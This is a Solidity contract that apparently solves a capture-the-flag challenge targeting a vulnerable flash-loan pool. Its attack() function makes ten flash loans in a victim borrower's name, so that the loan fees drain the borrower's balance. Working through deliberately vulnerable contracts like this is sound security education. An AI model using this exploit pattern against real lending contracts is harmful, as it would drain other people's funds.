// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackReceiver is Ownable {
    NaiveReceiverLenderPool public pool;
    address public borrower;

    constructor(address _pool, address _borrower) {
        pool = NaiveReceiverLenderPool(payable(_pool));
        borrower = _borrower;
    }

    function attack() external onlyOwner {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(borrower, 10 * 1e18);
        }
    }
}
